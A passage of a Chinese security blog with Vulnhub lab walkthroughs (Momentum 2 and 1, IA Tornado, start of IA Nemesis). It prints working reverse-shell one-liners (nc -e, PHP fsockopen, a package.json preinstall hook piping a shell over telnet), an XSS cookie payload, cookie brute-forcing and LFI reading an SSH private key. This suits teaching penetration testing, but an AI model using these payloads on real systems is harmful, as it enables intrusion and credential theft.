+<p>1.访问一下dashboard.html页面，是一个上传页，会将文件传到目录&#x2F;owls下，而这个目录无法直接上传php文件，只能上传txt文件：</p>
+<p><img src="/2022/08/15/Momentum-2/7.png" alt="image-"></p>
+<p>2.在前端js是没有做出文件上出限制的，目录扫描到ajax.php是0kb，可以去查看ajax.php.bak文件，发现规定在cookie中做出了上传限制，则想到BP抓包修改cookie：</p>
+<p><img src="/2022/08/15/Momentum-2/8.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/9.png" alt="image-"></p>
+<p>ajax.php.bak代码的内容是：当cookie存在，且键名为admin时，是可以上传pdf、php、txt文件的；不过admin需要一个值，代码中已经给出了值，但是在这个值的最后还缺少一位大写的字符；此外，还要使用post方式提交一个参数secure；最后上传成功时会返回一个1</p>
+<p>3.使用crunch生成一个最后一位是大写的字符字典，用于等下BP去爆破cookie；并且修改kali自带的webshell，准备上传：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -t , -o pass.txt</span><br><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-2/10.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="burpsuite抓包修改">Burpsuite抓包修改</span></h3><blockquote>
+<p>1.在dashboard.html选择上传php-reverse-shell.php，用BP拦截后，导入Intruder模块，加载刚才生成的字典pass.txt，并添加一个POST数据：</p>
+<p><img src="/2022/08/15/Momentum-2/12.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/13.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/14.png" alt="image-"><br>2.开始爆破cookie，发现最后的大写字符是R，来到Repeater模块，添加cookie和post后发送包，在kali开启端口监听，在&#x2F;owls目录触发webshell：</p>
+<p><img src="/2022/08/15/Momentum-2/15.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/16.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/17.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/18.png" alt="image-"></p>
+<p>3.用python构建一个交互式shell，然后在&#x2F;home&#x2F;athena目录下可以发现第一个flag，即user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-2/19.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查看同目录下的password-reminder.txt文件，得到一个密码提示，Asterisk是<em>的意思，可以猜测是任意字符，但其实ssh登录尝试一下就是</em>：</p>
+<p><img src="/2022/08/15/Momentum-2/20.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/21.png" alt="image-"></p>
+<p>2.查看当前用户权限，可以以root身份执行cookie-gen.py，查看文件，发现会将输入的值传给seed参数，然后写入到log.txt中，在echo时会执行bash命令：</p>
+<p><img src="/2022/08/15/Momentum-2/22.png" alt="image-"></p>
+<p>3.可以直接输入反弹shell给seed，然后kali开启对应端口监听，在&#x2F;root目录下能得到第二个flag，即root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反弹shell：;nc 192.168.56.102 12345 -e /bin/sh;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/15/Momentum-2/23.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-2/24.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/Momentum-1/">
+                Momentum 1
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="momentum1">Momentum:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称momentum1">名称：Momentum:1</span></h4><h4><span id="发布日期2021422">发布日期：2021.4.22</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名momentumova">文件名：Momentum.ova</span></h4><h4><span id="文件大小662mb">文件大小：662MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentumova">下载地址：</span></h4><h4><span id="md5-556bea96fe2cb1506814d1e79f5c5e19">MD5: 556BEA96FE2CB1506814D1E79F5C5E19</span></h4><h4><span id="sha1-40c918a7eff2eb3cf1708428a583702a4bffd96c">SHA1: 40C918A7EFF2EB3CF1708428A583702A4BFFD96C</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Momentum和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/Momentum-1/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.106 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现四个可见目录，可以去看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="xss漏洞利用">XSS漏洞利用</span></h3><blockquote>
+<p>1.访问192.168.56.106&#x2F;js，发现有一个main.js，js里有个重定向链接opus-details.php?id&#x3D;，后面拼接了个参数str，而这个php是主页图片点击后再点击一次的详情介绍：</p>
+<p><img src="/2022/08/15/Momentum-1/7.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/8.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/9.png" alt="image-"></p>
+<p>2.拼接的str字串会被直接打印出来，因为是js下进行构建的，首先想到xss，构造xss的payload爆出cookie：</p>
+<p><img src="/2022/08/15/Momentum-1/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/11.png" alt="image-"></p>
+<p>3.这cookie明显是进行了加密，回到main.js有提示，使用的是aes，进行解密得到很像用户名-密码的形式的字串auxerre-alienum##：</p>
+<p><img src="/2022/08/15/Momentum-1/12.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh登录准备提权">SSH登录，准备提权</span></h3><blockquote>
+<p>1.因为靶机有开放22端口，利用ssh登录，发现用户auxerre的密码就是auxerre-alienum##：</p>
+<p><img src="/2022/08/15/Momentum-1/13.png" alt="image-"></p>
+<p>2.接下来我们要使用LinEnum.sh这个工具对靶机进行进一步信息收集，在kali搭建一个http服务，准备上传工具到靶机<br>（工具地址：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%EF%BC%89%EF%BC%9A">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh）：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/14.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/LinEnum.sh，靶机下载工具（文件在桌面）</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/15.png" alt="image-"></p>
+<p>3.添加权限，靶机运行LinEnum.sh后，查看输出信息，发现6379端口占用，此端口是数据库redis的默认端口，确认后可以尝试kali登录redis：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh &gt; 1.txt</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/16.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/17.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/18.png" alt="image-"></p>
+<p>4.现在我们可以尝试利用ssh远程连接6379端口，然后在kali端登录，这里kali同样使用6379端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.56.106</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/19.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/20.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.我们可以在数据库内看到一个rootpass键，而键内包含着很像是密码的字串，使用root用户登录，成功提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get rootpass</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/21.png" alt="image-"></p>
+<p>2.进行root登录，在&#x2F;root目录下能找到flag，即root.txt：</p>
+<p><img src="/2022/08/15/Momentum-1/22.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/IA-Tornado/">
+                IA Tornado
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="ia-tornado">IA: TORNADO</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称ia-tornado">名称：IA: Tornado</span></h4><h4><span id="发布日期20201220">发布日期：2020.12.20</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>catchme:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名tornadoova">文件名：tornado.ova</span></h4><h4><span id="文件大小1019mb">文件大小：1019MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomiatornadoova">下载地址：</span></h4><h4><span id="md5-86b49bd71057db337a85c1ec1bab1076">MD5: 86B49BD71057DB337A85C1EC1BAB1076</span></h4><h4><span id="sha1-a74d80b7bde2b4da63aaf1e6b4714e43d6862409">SHA1: A74D80B7BDE2B4DA63AAF1E6B4714E43D6862409</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机tornado和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/IA-Tornado/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，还是Apache初始页，源码没有更多信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.132 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现&#x2F;bluesky目录，页面源码也没发现更多可用信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/6.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/7.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞发现">文件包含漏洞发现</span></h3><blockquote>
+<p>1.我们继续对&#x2F;bluesky目录进行扫描，发现有登录页与注册页，我们在注册页随意注册然后登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132/bluesky -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/8.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/9.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/10.png" alt="image-"></p>
+<p>2.登录后，在PORTFOLIO页能发现提示存在LFI，并且在源码内有路径提示：</p>
+<p><img src="/2022/08/15/IA-Tornado/11.png" alt="image-"></p>
+<p>3.利用LFI，我们可以获取到一些登录账号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.132/~tornado/imp.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/12.png" alt="image-"></p>
+</blockquote>
+<h3><span id="sql截断攻击">SQL截断攻击</span></h3><blockquote>
+<p>1.然而，当我们使用这些账号，会发现这些账号都已经被注册了，这时我在注册页源码发现前端对email长度做了最大限制：</p>
+<p><img src="/2022/08/15/IA-Tornado/13.png" alt="image-"></p>
+<p>2.这时可以想到是否存在SQL截断攻击的利用，修改maxlength后测试发现，能够将jacob@tornado用户的密码更改：</p>
+<p><img src="/2022/08/15/IA-Tornado/14.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/15.png" alt="image-"></p>
+<p>3.成功登录到jacob@tornado：</p>
+<p><img src="/2022/08/15/IA-Tornado/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="命令注入构建shell">命令注入，构建shell</span></h3><blockquote>
+<p>1.现在我们可以在CONTACT页面输入payload，并在kali开启对应监听，获得shell：</p>
+<p><img src="/2022/08/15/IA-Tornado/17.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.56.102&quot;,9002);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"></span><br><span class="line">nc -lvnp 9002</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.查看可用文件权限，发现npm可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>2.先在kali下写一个json文件，如package.json，开启http服务：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim package.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;follow jin on medium and twitter&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;preinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|telnet 192.168.56.102 9003 &gt; /tmp/f&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server <span class="number">8001</span></span><br></pre></td></tr></table></figure>
+
+<p>3.在靶机&#x2F;tmp目录下建立一个json目录，然后获取json文件，再利用npm触发shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir jin</span><br><span class="line">wget http://192.168.56.102:8001/package.json</span><br><span class="line">mv package.json jin</span><br><span class="line">chmod +s jin/</span><br><span class="line"></span><br><span class="line">sudo -u catchme /usr/bin/npm i /tmp/jin — unsafe</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/19.png" alt="image-"><br><img src="/2022/08/15/IA-Tornado/20.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/21.png" alt="image-"></p>
+<p>4.可以成功地在catchme用户目录下找到第一个flag，user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -al</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/22.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查看同目录下的enc.py文件，发现是个加密程序，告知我们密文，粗略阅读程序，明显是凯撒密码的变种，我们利用<a target="_blank" rel="noopener" href="https://www.boxentriq.com/code-breaking/caesar-cipher%EF%BC%8C%E4%B8%8D%E4%BD%BF%E7%94%A8key%E8%87%AA%E5%8A%A8%E7%A0%B4%E8%A7%A3%EF%BC%9A">https://www.boxentriq.com/code-breaking/caesar-cipher，不使用key自动破解：</a></p>
+<p><img src="/2022/08/15/IA-Tornado/23.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/24.png" alt="image-"></p>
+<p>2.但自动破解出来的并不是密码，但非常接近了，我们回看程序，对比自动解出的字串，得到key是u，而w是在u后的字符，不应该变化，可分析出最后密码是idkrootpassword：</p>
+<p><img src="/2022/08/15/IA-Tornado/25.png" alt="image-"></p>
+<p>3.最后能在&#x2F;root目录下发现第二个flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/26.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/IA-Nemesis/">
+                IA Nemesis
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="ia-nemesis-101">IA: NEMESIS (1.0.1)</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称ia-nemesis-101">名称：IA: Nemesis (1.0.1)</span></h4><h4><span id="发布日期20201025">发布日期：2020.10.25</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>thanos:&#x2F;<del>&#x2F;flag1.txt<br>carlos:&#x2F;</del>&#x2F;flag2.txt<br>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度困难">难度：困难</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名nemesis-v101ova">文件名：Nemesis-v1.0.1.ova</span></h4><h4><span id="文件大小537mb">文件大小：537MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomianemesis-v101ova">下载地址：</span></h4><h4><span id="md5-1e1b81a4b2af9a2bac30ed2b26b779bb">MD5: 1E1B81A4B2AF9A2BAC30ED2B26B779BB</span></h4><h4><span id="sha1-182f226ebd925575f50f24d04c515df79424775e">SHA1: 182F226EBD925575F50F24D04C515DF79424775E</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Nemesis和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/IA-Nemesis/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现开放了80，52845和52846端口，访问主页，在sign up页的validate函数可以发现登录的用户和密码，登录之后没有可用信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.131 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/5.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/8.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现robots.txt文件，提示我们去寻找可用的攻击点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.131 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/6.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/7.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.我们接着访问52845端口，网页源码没有过多发现：</p>
+<p><img src="/2022/08/15/IA-Nemesis/9.png" alt="image-"></p>
+<p>2.在Contact Us页发现在Message框内输入任何信息都会收到写入文件的提示，测试后发现确实存在文件包含漏洞：</p>
+<p><img src="/2022/08/15/IA-Nemesis/10.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/11.png" alt="image-"></p>
+<p>3.发现靶机存在thanos用户，可以尝试获取其ssh密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/thanos/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/12.png" alt="image-"></p>
+<p>4.将thanos用户ssh私钥获取到kali后，ssh登录thanos用户：</p>
